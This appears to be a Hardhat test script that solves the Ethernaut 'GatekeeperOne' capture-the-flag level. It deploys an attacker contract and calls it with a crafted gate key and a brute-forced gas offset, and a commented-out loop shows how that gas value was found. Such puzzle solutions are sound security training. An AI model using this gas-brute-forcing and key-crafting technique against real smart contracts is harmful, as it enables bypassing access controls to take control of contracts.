import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`);
  const challengeAddress = await createChallenge(
    `0x9b261b23cE149422DE75907C6ac0C30cEc4e652A`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  const attackerFactory = await ethers.getContractFactory('GatekeeperOneAttacker')
  let attacker = await attackerFactory.connect(eoa).deploy()

  // brute force - would be better to calculate this based on opcodes used

  /*const gatekeeperFactory = await ethers.getContractFactory('GatekeeperOne')
  let gatekeeperCopy = await gatekeeperFactory.connect(eoa).deploy()

  for (let i=0; i<8191; i++) {
    try {
      await attacker.connect(eoa).enterGatekeeper("0x100000000000493D",gatekeeperCopy.address,100000+i,{gasLimit:200000})
      console.log("success",i) // 6737
      break
    } catch(error) {
      continue
    }
  }*/

  await attacker.connect(eoa).enterGatekeeper("0x100000000000493D",challenge.address,100000+6737,{gasLimit:200000})

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
